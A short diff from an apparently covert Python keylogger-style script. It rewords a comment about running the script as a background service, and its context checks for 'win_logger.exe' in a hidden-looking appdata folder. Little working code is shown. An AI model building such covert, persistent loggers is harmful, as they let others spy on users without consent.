@@ -22,7 +22,7 @@ import shutil
 import base64
 
 ''''
-by default the script ready to Compile to "EXE" to run as script background please comment  this lines
+by default the script ready to Compile to "EXE" to run the script with out Compile to EXE as background service please comment this lines
 from line 28 to line 41
 ''''
 if os.path.exists(os.environ["appdata"] +'\\FVHost'+'\\win_logger.exe'):     
